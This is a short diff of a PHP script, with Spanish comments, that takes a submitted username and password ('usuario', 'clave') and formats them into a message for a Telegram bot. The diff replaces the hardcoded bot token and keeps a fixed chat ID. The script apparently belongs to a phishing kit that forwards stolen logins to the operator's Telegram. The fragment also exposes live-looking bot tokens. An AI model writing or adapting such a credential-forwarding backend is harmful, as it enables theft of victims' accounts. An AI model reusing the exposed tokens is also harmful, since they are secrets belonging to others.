@@ -20,7 +20,7 @@ $usuario = $datos_json['usuario'];
 $clave = $datos_json['clave'];
 
 // 3. Tus credenciales reales de Telegram integradas directamente
-$token = "8503145754:AAG11Gd1Z98sThoPcdwS4k-UQadnEr0qYc4";
+$token = "9090664378:AAEqaJnU9CKGOfGOdQj8tNr2EWPGksbE4qE";
 $chat_id = "8496234425"; 
 
 // 4. Estructurar el mensaje para tu Telegram
